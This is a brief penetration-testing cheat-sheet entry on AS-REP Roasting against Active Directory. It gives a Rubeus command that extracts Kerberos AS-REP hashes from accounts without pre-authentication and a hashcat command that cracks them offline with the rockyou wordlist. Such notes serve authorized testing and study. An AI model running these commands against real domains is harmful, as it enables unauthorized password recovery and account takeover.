Using Rubeus

Rubeus performs AS-REP Roasting by requesting AS-REP messages for Active Directory accounts with Kerberos pre-authentication disabled. The returned Kerberos data can be cracked offline to recover user passwords.

Advantages

Minimal network traffic and supports offline password cracking.

Disadvantages

Requires Kerberos pre-authentication to be disabled and can still be detected.

Performing AS-REP Roasting From User

.\Rubeus.exe asreproast /nowrap

Crack Session Key Use Hashcat

sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
